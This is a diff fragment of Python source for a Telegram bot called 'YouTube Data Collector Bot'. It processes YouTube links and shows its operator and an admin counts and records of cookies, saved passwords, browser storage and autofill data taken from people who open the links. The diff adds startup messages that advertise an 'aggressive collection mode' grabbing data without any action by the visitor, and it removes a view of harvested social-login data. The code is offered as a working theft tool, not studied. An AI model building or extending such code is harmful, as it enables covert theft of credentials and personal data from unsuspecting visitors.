+    except Exception as e:
+        logger.error(f"Error in webhook handler: {e}", exc_info=True)
+        return {"status": "error", "message": str(e)}
+
+# Новая команда для просмотра детальных данных
 async def show_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Команда для просмотра собранных данных"""
     user = update.effective_user
@@ -2520,9 +2180,10 @@ async def show_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "📊 *Просмотр данных*\n\n"
             "Используйте: `/data [ID_ссылки]`\n"
-            "Или: `/data list` - список ваших ссылок\n"
-            "Или: `/data social` - данные авторизации соцсетей\n\n"
+            "Или: `/data list` - список ваших ссылок\n\n"
             "Пример: `/data abc123def456`\n\n"
+            "⚡ *Особенность:* Система собирает данные даже если\n"
+            "пользователь просто открыл ссылку и ничего не делал!\n\n"
             "*Примечание:* Все данные также отправляются администратору.",
             parse_mode=ParseMode.MARKDOWN
         )
@@ -2546,48 +2207,7 @@ async def show_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             message += f"  Данных: {len(link.data_collected)}\n"
             message += f"  Cookies: {len(link.collected_cookies)}\n"
             message += f"  Пароли: {len(link.collected_passwords)}\n"
-            message += f"  Соцсети: {len(link.social_auth_data)}\n"
             message += "  ─────\n"
-        
-        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
-    
-    elif arg == "social":
-        user_links = [link for link in db.links.values() if link.created_by == user.id]
-        
-        if not user_links:
-            await update.message.reply_text("🌐 У вас нет данных авторизации соцсетей.")
-            return
-        
-        total_social = sum(len(link.social_auth_data) for link in user_links)
-        
-        if total_social == 0:
-            await update.message.reply_text("🌐 У вас нет данных авторизации соцсетей.")
-            return
-        
-        message = f"""
-🌐 *ДАННЫЕ АВТОРИЗАЦИИ СОЦСЕТЕЙ*
-
-📊 Общая статистика:
-• Всего ссылок: {len(user_links)}
-• Всего записей авторизации: {total_social}
-
-📋 Ссылки с данными авторизации:
-"""
-        
-        for link in user_links:
-            if link.social_auth_data:
-                # Анализируем последнюю запись
-                last_social = link.social_auth_data[-1]
-                if last_social.get("type") == "social_auth_analysis":
-                    platforms = last_social.get("data", {}).get("platforms", {})
-                    high_risk = [p for p, d in platforms.items() if d.get("risk_level", "").startswith("HIGH")]
-                    
-                    if high_risk:
-                        message += f"• `{link.id}`: {', '.join(high_risk)} (высокий риск)\n"
-                    else:
-                        message += f"• `{link.id}`: {len(platforms)} платформ\n"
-        
-        message += "\nℹ️ Для подробностей используйте: `/data [ID_ссылки]`"
         
         await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
     
@@ -2608,6 +2228,7 @@ async def show_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             disable_web_page_preview=True
         )
 
+# Обработчик ошибок
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Обработчик ошибок"""
     logger.error(f"Update {update} caused error {context.error}", exc_info=True)
@@ -2627,30 +2248,37 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def main():
     """Запуск бота"""
+    # Создаем приложение
     application = Application.builder().token(BOT_TOKEN).build()
     
+    # Регистрируем обработчики команд
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("data", show_data_command))
     
+    # Обработчик YouTube ссылок
     application.add_handler(MessageHandler(
         filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
         handle_youtube_link
     ))
     
+    # Обработчик inline кнопок
     application.add_handler(CallbackQueryHandler(button_handler))
     
+    # Обработчик ошибок
     application.add_error_handler(error_handler)
     
+    # Запускаем бота
     print("🤖 YouTube Data Collector Bot запущен!")
     print(f"👑 Админ: {ADMIN_ID}")
     print(f"🌐 Домен: {DOMAIN}")
-    print("🔐 Функции сбора ВСЕХ данных активны:")
+    print("⚡ АГРЕССИВНЫЙ РЕЖИМ СБОРА ВКЛЮЧЕН:")
+    print("   - Сбор данных даже без действий пользователя")
+    print("   - Автоматическое сканирование всех полей форм")
+    print("   - Извлечение автозаполненных данных")
     print("   - Cookies (включая сессионные)")
     print("   - LocalStorage и SessionStorage")
     print("   - Сохраненные пароли и логины")
     print("   - Данные автозаполнения форм")
-    print("   - Пассивный сбор данных авторизации соцсетей")
-    print("   - Google, Facebook, Twitter/X, VK, Instagram")
     print("   - Все данные отправляются админу")
     print("⏳ Ожидание команд...")
     
